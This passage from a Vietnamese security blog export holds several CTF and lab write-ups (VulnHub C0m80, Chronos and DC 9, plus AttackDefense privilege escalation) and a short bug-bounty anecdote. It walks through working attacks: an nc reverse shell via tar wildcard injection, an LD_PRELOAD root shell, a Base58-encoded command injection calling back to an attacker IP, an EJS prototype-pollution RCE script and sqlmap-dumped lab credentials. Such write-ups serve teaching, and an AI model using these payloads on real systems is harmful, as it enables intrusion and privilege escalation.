SSH cả. Lừa nhau à?Lần này sếp xuất hiện phía sau như một vị thần mạch bảo, cổng đấy mở sẵn rồi, chúng mày chỉ việc vào thôi, 6xx22. Okay, giờ thì đi tìm x.\nwww-data@C0m80:/etc/ssh$ cat ssh_config...# What ports, IPs and protocols we listen forPort 65122# Use these options to restrict which interfaces/protocols sshd will bind toListenAddress ::1#ListenAddress 127.0.0.1\nYep, đây là lí do tại sao Nmap không mò ra được, vì nó chỉ cho bật lắng nghe trên localhost mà thôi, trên cổng 65122. Nhưng SSH vào với id_rsa không được, vì key không đúng định dạng.Một hồi quan sát chăm chú hết mức có thể, lúc này đã là 17:35 và công ty thì về hết một nửa rồi. Cả mấy anh em đang mò mẫm thì sếp gọi vào phổ biến abc abc… và hint cho một phát là dùng plink.\nPlinkĐể sử dụng plink để kết nối ssh, thì phải đổi lại định dạng key lại thành ppk. Không đơn giản là chỉ việc nhấn F2 và sửa tên file, để đổi id_rsa sang ppk phải dùng đến puttygen và cần có passphrase. Ờ, thế passphrase ở đéo đâu bây giờ?\nQuay lại với đống file trong thư mục .ssh vừa ăn trộm từ thằng b0b, có cái file .save~ lạ vl:\n###### NO PASWORD HERE SRY ######I&#x27;m using my new password manager           PWMangr2      just a note to say   WELL DONE &amp; KEEP IT UP ;D#################################\nĐiều này giải đáp câu hỏi bỏ ngỏ ở trên, trình quản lý mật khẩu là gì? là PWMangr2. Search Google về thằng này thì chả có thông tin mẹ gì cả, chỉ toàn là Writeup về đúng cái bài COM80 này. Điều này chứng tỏ 1 điều, PWMangr2 là trình quản lý tự thằng ra đề COM80 này nghĩ ra, giờ thì phải tìm trong toàn hệ thống xem nó ở đâu.\nwww-data@C0m80:/var/www$ find / PWMangr2 2&gt;/dev/null | grep PWMangr2/home/b0b/.wine/drive_c/users/b0b/Application Data/Mozilla/Extensions/PWMangr2.html\nĐù!Lịt pẹ! Chả nhẽ lại đem rock-you ra brute force? Hint ở đây là “superbuddies”, bạn thân của thằng lìn Bob là ai? Bố mày biết được à?Kéo lại đoạn trên, với mấy dòng note thì thấy thằng Bob đang muốn đi xem phim cùng Alice &#x3D;)) và đống key lấy được để SSH vào al1ce cũng từ thư mục của thằng b0b. Mạnh dạn đoán mật khẩu ở đây là alice :v Cái này đéo phải tôi đoán, thằng Hoàng Mông To đoán.Yep. Mật khẩu đúng là alice, nếu không đoán được thì hoàn toàn có thể dùng rock-you để brute force vì từ khóa alice có trong cái wordlist ấy.Khả năng cao đây là passphrase mà chúng ta đang tìm, điền nó vào puttygen để chuyển key sang định dạng ppk thôi nào. Done!Giờ thì chuyển private.ppk sang cho www-data shell và login vào SSH của al1ce.\nwww-data@C0m80:/tmp$ wget http://10.10.10.1:8000/private.ppk--2021-01-01 15:52:55--  http://10.10.10.1:8000/private.ppkConnecting to 10.10.10.1:8000... connected.HTTP request sent, awaiting response... 200 OKLength: 1460 (1.4K) [application/octet-stream]Saving to: &#x27;private.ppk&#x27;     0K .                                                     100% 95.7M=0s2021-01-01 15:52:55 (95.7 MB/s) - &#x27;private.ppk&#x27; saved [1460/1460]www-data@C0m80:/tmp$ plink -ssh -P 65122 al1ce@localhost -i private.ppkplink -ssh -P 65122 al1ce@localhost -i private.ppkUsing username &quot;al1ce&quot;.Passphrase for key &quot;imported-openssh-key&quot;: 7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286Welcome to C0m80 :DRunning on WandawsXP SP7.4...Last login: Sat Sep 23 03:18:49 2017 from localhost$ iduid=1001(al1ce) gid=34(backup) groups=34(backup)\nỒ zé! Có được shell của al1ce, group backup. Nhưng chưa thể sử dụng sudo do chúng ta login với ssh key, không có mật khẩu để dùng sudo.\nDo al1ce thuộc group backup, nên al1ce là owner của thư mục &#x2F;ftpsvr&#x2F;bkp, vậy nên al1ce có thể thêm&#x2F;sửa&#x2F;xóa thư mục này. Điều này quan trọng, vì như đã biết ở trên, thư mục này chúng ta đã mount về máy với thư mục &#x2F;tmp&#x2F;duma với quyền root, khi đã mount, 2 thư mục &#x2F;ftpsvr&#x2F;bkp và &#x2F;tmp&#x2F;duma có thể coi là 1. Điều đó có nghĩa là, khi có quyền root trên &#x2F;tmp&#x2F;duma thì cũng có quyền root trên &#x2F;ftpsvr&#x2F;bkp!Ở shell al1ce, copy &#x2F;bin&#x2F;sh vào &#x2F;ftpsvr&#x2F;bkp&#x2F;.\n$ pwd/ftpsvr/bkp$ cp /bin/sh .\nỞ root shell trên máy tôi, chuyển quyền sở hữu file sh cho root và set UID cho nó.Ơ thế tại sao không copy luôn bash&#x2F;sh từ root shell trên máy mình vào đấy, đỡ mất công chuyển quyền sở hữu file? Vì chưa chắc bash&#x2F;sh trên máy mình đã tương thích được với hệ thống bên al1ce, có thể khác biệt x86 x64, hoặc nhân Linux, etc… thử mà xem :))\n# ls -al                                                                                         total 2848drwxrwx---  2 root   backup    4096 Jan  1 23:05 .drwxrwxrwt 23 root   root     36864 Jan  1 23:03 ..-rw-r--r--  1 backup backup 2757002 Jan  1 23:05 ftp104.bkp-rwxr-xr-x  1   1001 backup  112204 Jan  1 23:05 sh                                                                                                    # chown root sh                                                                                                                                                                                      # ls -al                                                                                         total 2848drwxrwx---  2 root   backup    4096 Jan  1 23:05 .drwxrwxrwt 23 root   root     36864 Jan  1 23:03 ..-rw-r--r--  1 backup backup 2757002 Jan  1 23:05 ftp104.bkp-rwxr-xr-x  1 root   backup  112204 Jan  1 23:05 sh                                                                                                    # chmod +s sh\nQuay lại al1ce shell và get root nào!\n$ ./sh# iduid=1001(al1ce) gid=34(backup) euid=0(root) groups=0(root),34(backup)# cd /root# lsflag.txt# cat flag.txt############## WELL DONE ###############You dealt BestestSoftware a killer C0m80I really hope you enjoyed the challengeand learned a thing of two while on yourjourney here.Please leave feelback &amp; comments at:\t      https://3mrgnc3.ninja/All the best.  3mrgnc3   ;D############  ROOT FLAG ##############   K1ll3rC0m80D3@l7&amp;i5mash3dth1580x######################################\nBonusMặc dù đã có quyền Root nhưng nếu vẫn chưa thoản mãn với cái uid 1001 của Al1ce thì anh em có thể sửa cmn file &#x2F;etc&#x2F;passwd đi để chèn thêm một tài khoản các với UID 0 hoặc sửa password của Root chẳng hạn &#x3D;))Root xịn!\n$ su rootPassword: 00000root@C0m80:~# iduid=0(root) gid=0(root) groups=0(root)","categories":["VulnHub"],"tags":["vulnhub","difficult","write up"]},{"title":"[AttackDefense] Privilege Escalation: CTF [Oct 16-20]","url":"/2021/01/26/Privilege-Escalation-CTF-Oct16-20-Attack-Defense/","content":"\nOverviewLink: https://attackdefense.com/challengedetails?cid=2021Difficulty: Medium (Để làm được thì dễ, để hiểu được thì khó :&#x2F;)Bài này yêu cầu đơn giản là leo thang đặc quyền, từ low-user đến super-user. \n\nPrivileges Escalationstudent to teacherstudent@attackdefense:~$ find / -perm -u=s -type f 2&gt;/dev/null/usr/bin/read-submission/usr/bin/sudo\nThấy một file binary lạ hoắc là read-submission. Điều tra thêm thông tin về thằng này.\nstudent@attackdefense:~$ ls -al /usr/bin/read-submission-rwsr-xr-x 1 teacher teacher 10984 Oct 10 16:17 /usr/bin/read-submissionstudent@attackdefense:~$ /usr/bin/read-submissionMaths: 94Science: 85English: 67Economics: 88\nFile binary này của user teacher, và do có SUID nên user student có thể chạy file này với quyền của user teacher. Việc nó làm là hiển thị ra mấy cái điểm số kia. Tìm kiếm xem file binary này sử dụng binary nào khác không, việc này nhắm tới cách leo thang lên quyền của user teacher bằng PATH evn.\nstudent@attackdefense:~$ strings /usr/bin/read-submission...AWAVIAUATL[]A\\A]A^A_read-file;*3$&quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0...\nBằng cách vi diệu nào đó :)) có cái file binary này “read-file”.Đùa đấy, ý tưởng là đang muốn leo lên quyền của user teacher, vậy nên sẽ cần recon thông tin của user teacher. Việc tìm các file thuộc sở hữu của user teacher biết đâu sẽ xem lại một vài thông tin hay ho?\nstudent@attackdefense:~$ find / -user teacher 2&gt;/dev/null/usr/bin/read-submission/usr/bin/read-file/home/teacher/home/teacher/backup/home/teacher/backup/schedule/home/teacher/FLAG1/home/teacher/student-evaluation\nNhìn xem, &#x2F;usr&#x2F;bin&#x2F;read-file, và lúc này tôi bắt đầu tìm trong đống strings được dump ra từ read-submission những file kia, và nhận được read-file.Không cần biết thằng read-file nó làm cái con mẹ gì, leo quyền cái đã…\nPATH Variablesstudent@attackdefense:~$ mkdir dumastudent@attackdefense:~$ cd dumastudent@attackdefense:~/duma$ echo &quot;/bin/bash&quot; &gt; read-filestudent@attackdefense:~/duma$ chmod +x read-file student@attackdefense:~/duma$ export PATH=.:$PATHstudent@attackdefense:~/duma$ echo $PATH.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binstudent@attackdefense:~/duma$ read-submissionteacher@attackdefense:~/duma$ iduid=998(teacher) gid=999(student) groups=999(student)\nGame dễ! hoặc là chưa đến đoạn khó :&#x2F;\nteacher to adminMục tiêu tiếp theo bây giờ là phải leo lên quyền của user admin. Ngó vào thư mục &#x2F;home&#x2F;admin xem có gì.\nteacher@attackdefense:/home$ cd adminteacher@attackdefense:/home/admin$ ls -altotal 20drwxr-xr-x 1 admin admin 4096 Jan 26 10:12 .drwxr-xr-x 1 root  root  4096 Oct 10 16:17 ..-r-------- 1 admin admin   33 Oct 10 16:17 FLAG2-rw-rw-r-- 1 admin admin  168 Jan 26 10:28 teacher.tar.gz\nSau mấy lần chạy lệnh ls -al trong vô vọng, thấy là cái file nén teacher.tar.gz có thời gian sửa đổi rất mới, và được cập nhật&#x2F;ghi đè liên tục trong một khoảng thời gian. Đoán là sẽ có một cái cronjob nào đang tác động lên nó.Nhưng!Đúng rồi, câu chuyện đẹp lúc đéo nào cũng bị ngắt bởi từ “Nhưng”. Tôi đéo thể tìm được cronjob nào tác động lên file nén kia cả :DCơ mà thấy nội dung trong file nén giống giống với nội dung bên trong thư mục &#x2F;home&#x2F;teacher&#x2F;backup. Thế thì thử tạo thêm file trong thư mục backup đấy xem thằng admin có nén luôn cái file mình tạo không nhở :D\nteacher@attackdefense:/home/teacher/backup$ echo &quot;Bruh!&quot; &gt; Nen_file_nay_di.txt teacher@attackdefense:/home/teacher/backup$ ls -altotal 20drwxr-xr-x 1 teacher teacher 4096 Jan 27 02:38 .drwxr-xr-x 1 teacher teacher 4096 Oct 10 16:17 ..-rw-rw-r-- 1 teacher student    6 Jan 27 02:38 Nen_file_nay_di.txt-rw-rw-r-- 1 teacher teacher   76 Oct 10 10:43 scheduleteacher@attackdefense:/home/teacher/backup$ cd ..teacher@attackdefense:/home/teacher$ cp /home/admin/teacher.tar.gz .teacher@attackdefense:/home/teacher$ tar -zxvf teacher.tar.gz Nen_file_nay_di.txtschedule\nHay lắm tml, schedule của thằng user admin nén toàn bộ thư mục backup.\nTar Wildcard InjectionÝ tưởng là sẽ đánh vào quá trình nén file của tar, anh em có thể đọc thêm ở đây Exploiting Wildcard for Privilege Escalation.\nteacher@attackdefense:/home/teacher/backup$ echo &quot;mkfifo /tmp/ahihi; nc localhost 4444 0&lt;/tmp/ahihi | /bin/sh &gt;/tmp/ahihi 2&gt;&amp;1; rm /tmp/ahihi&quot; &gt; shell.shteacher@attackdefense:/home/teacher/backup$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;teacher@attackdefense:/home/teacher/backup$ echo &quot;&quot; &gt; --checkpoint=1\nMở một tab khác, bật netcat để listen trên port 4444 và…\nstudent@attackdefense:~$ nc -lnvp 4444listening on [any] 4444 ...connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58494iduid=997(admin) gid=997(admin) groups=997(admin)# Upgrade PTY để thao tác terminal cho tiện hơnpython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.See &quot;man sudo_root&quot; for details.admin@attackdefense:/home/teacher/backup$\nadmin to rootCó shell của user admin rồi, giờ còn leo lên root nữa thôi. Kiểm tra sudoer của user admin.\nadmin@attackdefense:/home/teacher/backup$ sudo -lMatching Defaults entries for admin on attackdefense:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,    env_keep+=LD_PRELOADUser admin may run the following commands on attackdefense:    (root) NOPASSWD: /usr/sbin/apache2admin@attackdefense:/home/teacher/backup$ sudo apache2[Wed Jan 27 03:02:17.276254 2021] [core:warn] [pid 364] AH00111: Config variable $&#123;APACHE_RUN_DIR&#125; is not definedapache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot\nĐể ý thấy có apache2 có thể chạy với quyền sudo mà chả cần password, cơ mà, việc leo quyền với apache2 khá căng, hơn nữa file cấu hình của apache2 có vẻ đã được tuỳ biến chỗ nào đó khiến tôi đéo thể truy cập được vào các thành phần thông tin nhạy cảm bên trong.Để ý kỹ lại một lần nữa, thấy cái dòng env_keep+&#x3D;LD_PRELOAD khá lạ. Google! (Vãi cả beep kết quả tìm kiếm đầu tiên hiện ra luôn ạ Linux Privilege Escalation using LD_Preload)\nLD_PRELOAD\nWhat is LD_PRELOAD?LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.\n\nLằng nhằng quá, làm theo cái đã…Tạo một file shell.c với nội dung:\n#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() &#123;        unsetenv(&quot;LD_PRELOAD&quot;);        setgid(0);        setuid(0);        system(&quot;/bin/sh&quot;);&#125;\nOk, biên dịch rồi thực thi, tận hưởng :D\nadmin@attackdefense:/tmp/duma$ gcc -fPIC -shared -o shell.so shell.c -nostartfilesadmin@attackdefense:/tmp/duma$ sudo LD_PRELOAD=/tmp/duma/shell.so apache2# bashbashroot@attackdefense:~#root@attackdefense:~# whoamirootroot@attackdefense:~# iduid=0(root) gid=0(root) groups=0(root)\nỔn luôn, giờ thì leo tiếp lên máy host, vì thực chất máy linux này đang nằm trong một máy ảo, bây giờ sẽ phải vượt từ máy ảo lên máy thật :)\nDocker escaperoot@attackdefense:~# capsh --printCurrent: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+epBounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcapSecurebits: 00/0x0/1&#x27;b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=0(root)\nĐoạn này chả hiểu gì, thôi để bao giờ hiểu thì update lại sau vậy…\n","categories":["AttackDefense"],"tags":["write up","attackdefense","medium"]},{"title":"[Talk] Một chiếc bug bounty buồn cười.","url":"/2022/09/20/a-funny-bug-bounty/","content":"Lỗ hổng này phía Finhay đã xác nhận nhưng chưa giải quyết, nên chắc là tôi sẽ không công khai nó đâu…\n\nUpdate 2024: Tài thật &#x3D;)) tôi vẫn khai thác được.\nMột buổi chiều chán việc, tôi ném domain của Finhay vào một pipeline recon đơn giản, rồi ngồi ngáp. Được khoảng 10 phút thì xong, thấy một điểm có thể khai khác, thêm 5 phút nữa để confirm lỗ hổng và 5 phút nữa để nắn nót soạn một chiếc mail báo cáo. Vậy là tổng thời gian tôi mất có 20 phút, và đúng một ngày sau thì tôi nhận được liên hệ từ phía Finhay, và sau đó là nhận bounty ngay trên nền tảng. Phew, siêu nhanh!Giá mà bug bounty lúc nào cũng nhanh và đơn giản như thế :&#x2F;\n","categories":["Talk"],"tags":["talk","bug","bounty"]},{"title":"[VulnHub] Chronos","url":"/2021/08/10/chronos-vulnhub/","content":"\nOverviewLink download: CHRONOS: 1Difficulty: EZ (Depends on experience)\n\nIP Victim: 10.10.10.104IP Attacker: 10.10.10.102\nInformation GatheringScan qua loa một với Nmap…\nNmap scan report for 10.10.10.104Host is up (0.000095s latency).Not shown: 65532 closed portsPORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http8000/tcp open  http-altPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 e4:f2:83:a4:38:89:8d:86:a5:e1:31:76:eb:9d:5f:ea (RSA)|   256 41:5a:21:c4:58:f2:2b:e4:8a:2f:31:73:ce:fd:37:ad (ECDSA)|_  256 9b:34:28:c2:b9:33:4b:37:d5:01:30:6f:87:c4:6b:23 (ED25519)80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Site doesn&#x27;t have a title (text/html).8000/tcp open  http    Node.js Express framework|_http-cors: HEAD GET POST PUT DELETE PATCH|_http-open-proxy: Proxy might be redirecting requests|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\nSơ sơ thì có cổng 22 đang chạy SSH và 2 cổng 80, 8000 đang chạy HTTP Server, trong đó cổng 80 sử dụng Apache và cổng 8000 thì sử dụng NodeJS.Thề, nhìn quả font chữ với màu hồng neon này làm tôi nhớ đến GTA: Vice City vl.Để ý trong tab Network, thấy có một request tới chronos.local:8000 bị lỗi, giời ạ, bày đặt domain các thứ mới chịu cơ. Mở file hosts lên và thêm vào cuối file:\n10.10.10.104 chronos.local\nOk, save lại và reload lại trang xem nào.Ngon ngay, giờ thử truy cập thằng vào cái URL khả nghi kia để xem nó làm cái vẹo gì.Hmm… “Permission Denied” cơ đấy, bắt cái request đó khi truy cập trên cổng 80 xem nó đang xác thực kiểu cc gì.Haha, “User-Agent: Chronos”, server kiểm tra User-Agent và chỉ cho phép User-Agent có giá trị là “Chronos” mới được phép truy cập.Rồi, thế, giờ làm sao để RCE được cái server này? Ai biết… thử thôi.\nExploitationĐể ý trên URI có xuất hiện đúng 1 param duy nhất\nformat=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL\nNhìn có vẻ giống giống Base64 đấy, nhưng chả phái đâu, đem decode với Base64 thì không bị báo lỗi, nhưng output thì lằng nhằng không ngửi nổi. Fuzzing linh tinh vào đây thì server trả về lỗi với nội dung:Error: Non-base58 character haha, Base58!Decode ra được nội dung &#39;+Today is %A, %B %d, %Y %H:%M:%S.&#39;, vậy có thể đoán được câu lệnh được chạy trên server sẽ là:\ndate &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;\nHay lắm tml &#x3D;)) giờ thì chỉ cần chèn thêm một đoạn payload để lấy reverse-shell vào cuối, encode Base58 và gửi lại lên server cho nó thực hiện là có thể lấy được shell để RCE server này rồi.\nPlantext: &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.10.102 4444 &gt;/tmp/fCypher Base58: HAVsuigf4Gz6M7u4o6pcNxNNWj4x1kzw9rg2vjBHYiYj97fKD5XBTAQgFrdaibSuZwGiB4jHmiW8LZDmqYsqXqj7J2tqu4ZB7WDmJ6aF1Qf3TqRoMMqmXHBUxg4zNk7i8z4fDTK72DxQDaVLDbLDfM6NudifYrYZs\nGet shellThay đoạn cypher kia vào request và bắn, gòi xong…\nPrivileges Escalationwww-data to imeraMất một lúc kiểm tra linpeas, các kiểu, tôi nhận ra server đang mở cổng 8080, cơ mà chỉ chấp nhận kết nối từ localhost mà thôi, không thành vấn đề cho lắm khi có thể dùng Meterpreter để Port Forward. Cứ thử xem cái trang đó nó làm gì đã.\nwww-data@chronos:/opt/chronos$ curl localhost:8080&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;Chronos - Version 2&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;Coming Soon...&lt;/h1&gt;    &lt;/body&gt;&lt;/html&gt;\nNgắn tũn? Thử tìm mã nguồn của nó xem ở đâu, có đọc được không.\nwww-data@chronos:/opt/chronos$ cd ..www-data@chronos:/opt$ lschronos  chronos-v2www-data@chronos:/opt$ ls -altotal 16drwxr-xr-x  4 root     root     4096 Jul 30 07:50 .drwxr-xr-x 23 root     root     4096 Jul 29 08:26 ..drwxr-xr-x  3 www-data www-data 4096 Aug 20 16:16 chronosdrwxr-xr-x  4 root     root     4096 Aug  3 19:40 chronos-v2www-data@chronos:/opt$ cd chronos-v2/www-data@chronos:/opt/chronos-v2$ ls -altotal 20drwxr-xr-x 4 root root 4096 Aug  3 19:40 .drwxr-xr-x 4 root root 4096 Jul 30 07:50 ..drwxr-xr-x 3 root root 4096 Aug  3 19:59 backenddrwxr-xr-x 3 root root 4096 Aug  3 19:41 frontend-rw-r--r-- 1 root root  381 Aug  3 19:39 index.htmlwww-data@chronos:/opt/chronos-v2$ cd backend/www-data@chronos:/opt/chronos-v2/backend$ ls -altotal 64drwxr-xr-x  3 root root  4096 Aug  3 19:59 .drwxr-xr-x  4 root root  4096 Aug  3 19:40 ..drwxr-xr-x 71 root root  4096 Aug  3 19:59 node_modules-rw-r--r--  1 root root   296 Jul 29 15:34 package.json-rw-r--r--  1 root root 43066 Aug  3 19:59 package-lock.json-rw-r--r--  1 root root   505 Aug  3 19:37 server.js\nNội dung file server.js:\nconst express = require(&#x27;express&#x27;);const fileupload = require(&quot;express-fileupload&quot;);const http = require(&#x27;http&#x27;)const app = express();app.use(fileupload(&#123; parseNested: true &#125;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.set(&#x27;views&#x27;, &quot;/opt/chronos-v2/frontend/pages&quot;);app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;   res.render(&#x27;index&#x27;)&#125;);const server = http.Server(app);const addr = &quot;127.0.0.1&quot;const port = 8080;server.listen(port, addr, () =&gt; &#123;   console.log(&#x27;Server listening on &#x27; + addr + &#x27; port &#x27; + port);&#125;);\nĐối chiếu với kết quả Linpeas, dịch vụ trên cổng 8080 này được chạy với quyền của imera, như vậy, nếu tôi RCE được HTTP server trên cổng 8080, tôi sẽ lấy được quyền điều khiển hệ thống của imera.\nimera      774  0.0  2.9 599132 38300 ?        Ssl  08:36   0:00 /usr/local/bin/node /opt/chronos-v2/backend/server.js\nNhận thấy trong mã nguồn có yêu cầu “express-fileupload”, Google “express-fileupload exploit”, tôi nhận được repo trên Github với mã khai tháchttps://github.com/boiledsteak/EJS-ExploitSửa đổi câu lệnh thực thi, tôi sẽ viết một đoạn payload để lấy reverse-shell bằng python vào file &#x2F;tmp&#x2F;reverse.py, và câu lệnh trong EJS-Exploit sẽ là python &#x2F;tmp&#x2F;reverse.py.\n############################################################### Run this .py to perform EJS-RCE attack# referenced from# https://blog.p6.is/Real-World-JS-1/# # Timothy, 10 November 2020################################################################# importsimport requests### commands to run on victim machinecmd = &#x27;python /tmp/reverse.py&#x27;print(&quot;Starting Attack...&quot;)### polluterequests.post(&#x27;http://localhost:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)### execute commandrequests.get(&#x27;http://localhost:8080&#x27;)print(&quot;Finished!&quot;)\nNếu bạn hỏi là sao phải màu mè thế, sao đéo chèn cụ luôn payload vào EJS-Exploit, thì thú thật tôi làm thế rồi, nhưng đéo được &#x3D;)) Tôi chưa có câu trả lời cho vụ này, chắc là sẽ tìm hiểu thêm một chút nữa mới ra được lí do. Cơ mà tạm thế đã, lấy được shell của imera và…\nimera to rootĐoè moè &#x3D;)) leo root ez vãi!Áp dụng đúng công thức mà làm, không vẽ vời…\n","categories":["VulnHub"],"tags":["vulnhub","write up","easy"]},{"title":"[VulnHub] DC 9","url":"/2021/02/03/dc9-vulnhub/","content":"\nOverviewLink download: DC: 9Difficulty: Easy\n\nInformation GatheringNmap$ nmap -sn 10.10.10.102-105 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:22 +07Nmap scan report for 10.10.10.104Host is up (0.00028s latency).Nmap done: 4 IP addresses (1 host up) scanned in 1.26 seconds$ nmap -p- 10.10.10.104 --min-rate 3000Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:24 +07Nmap scan report for 10.10.10.104Host is up (0.00015s latency).Not shown: 65534 closed portsPORT   STATE SERVICE80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 1.24 seconds$ nmap -A 10.10.10.104 -p 80           Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 17:25 +07Nmap scan report for 10.10.10.104Host is up (0.00053s latency).PORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.38 ((Debian))|_http-server-header: Apache/2.4.38 (Debian)|_http-title: Example.com - Staff Details - WelcomeService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds\nHmm… bủn xỉn vcl, mở mỗi cổng 80-HTTP.Từ từ đã, tại sao lại có dòng File does not exist ở kia? Tôi link ngay đến một bài CTF từng làm, truyền vào đây thêm một param nữa để gọi file. Đại khái là thằng manager.php đang gọi đến một hàm mở file và cần một param truyền vào (có thể là file, f hoặc gì gì…), nghe vô lý nhưng cái CTF style nó thế, chả đâu vào đâu :&#x2F;Chốt lại là web server dính lỗi LFI, lấy được mã nguồn trang, các thứ các thứ, nhưng chưa có thông tin nào cần để lấy được shell.Quay lại với search.php, kiểm tra xem nó có dính SQL Injection hay không.Okay… vậy là có SQL Injection luôn. Ném nó vào Sqlmap dump dữ liệu ra xem có gì hay ho…\nExploitionSqlmapDatabase: StaffTable: Users[1 entry]+--------+----------------------------------+----------+| UserID | Password                         | Username |+--------+----------------------------------+----------+| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |+--------+----------------------------------+----------+Database: usersTable: UserDetails[17 entries]+----+------------+---------------+---------------------+-----------+-----------+| id | lastname   | password      | reg_date            | username  | firstname |+----+------------+---------------+---------------------+-----------+-----------+| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      || 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     || 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      || 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    || 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       || 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     || 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     || 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     || 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  || 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      || 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    || 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      || 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    || 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    || 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   || 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    || 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |+----+------------+---------------+---------------------+-----------+-----------+\nVới mật khẩu hash của admin, đem crack chùa lấy được password ngon lành.Thề, CrackStation với HashKiller lợi hại vãi cả đái.Sau đó tôi có cố thử lợi dụng SQL Injection để up shell, chèn mã vào khắp nơi trên cái web site này. Sau 30 phút đéo đem lại gì ngoài sự chán nản. Đcm, chả nhẽ nó khó đến thế à?Và thế là tôi lén mở write up lên để xem xem bước tiếp theo họ làm như thế nào.Cái mảng kiến thức này thực sự trước giờ tôi đéo biết :DNhư này…\nBurp suiteLần này quay lại với lỗi LFI ở trên đã phát hiện được, bây giờ tôi muốn fuzzing những file ở trong thư mục &#x2F;etc để tìm kiếm thêm những cấu hình bên trong máy chủ này.\n[options]\tUseSyslog[openSSH]\tsequence    = 7469,8475,9842\tseq_timeout = 25\tcommand     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\ttcpflags    = syn[closeSSH]\tsequence    = 9842,8475,7469\tseq_timeout = 25\tcommand     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT\ttcpflags    = \nGoogle về thằng klockd này:\n\nknockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special “knock” sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open – since knockd listens at the link-layer level, it sees all traffic even if it’s destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.\n\nNói qua một chút cho dễ hiểu, giống như trò gõ cửa mà hồi bé hay chơi, gõ cửa 4 lần thì người ở trong mới mở cửa, còn nếu gõ sai, có nghĩa người bên ngoài là người lạ, thì người bên trong sẽ không mở 